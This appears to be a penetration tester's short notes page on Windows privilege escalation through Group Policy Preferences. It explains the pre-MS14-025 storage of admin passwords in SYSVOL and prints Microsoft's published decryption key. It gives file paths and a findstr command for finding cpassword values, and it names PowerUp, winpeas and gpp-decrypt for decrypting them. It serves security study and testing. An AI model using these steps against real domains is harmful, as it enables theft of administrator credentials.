---
title: group policy preferences
category: win privesc
order: 1
---
---
[WPE-07 - Group Policy Preferences](https://pentestlab.blog/2017/03/20/group-policy-preferences/)

 Prior to patch MS14-025, there was a horrible storage of local administrator password, in a readable SMB share, SYSVOL, if the local administrator account was deployed via group policy.

 the keys are encripted but microsoft published the key
 ```
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```

##  1 find Groups.xml
ex:
```
C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
```
or:
```
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

##  2 decrypt

#### | PowerUp.ps1
```
Get-CachedGPPPassword //For locally stored GP Files
Get-GPPPassword //For GP Files stored in the DC
```
#### | winpeas
winpeas checks for it

#### | gpp-decrypt
```
cat groups.XML
...
cpassword="edbiausdhiuhasd1289471890234nias098124n98"
...
gpp-decrypt  edbiausdhiuhasd1289471890234nias098124n98
```
